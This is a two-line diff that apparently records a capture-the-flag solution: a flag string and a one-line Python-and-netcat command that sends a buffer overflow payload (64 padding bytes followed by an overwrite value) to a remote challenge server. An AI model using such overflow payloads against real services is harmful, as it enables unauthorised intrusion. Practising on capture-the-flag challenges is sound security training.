@@ -1,0 +1,2 @@
+flag{hiiiiiiiiii}
+(python -c 'print "A"*64 + "\x63\x30\x64\x65"') | nc hack.bckdr.in 9006
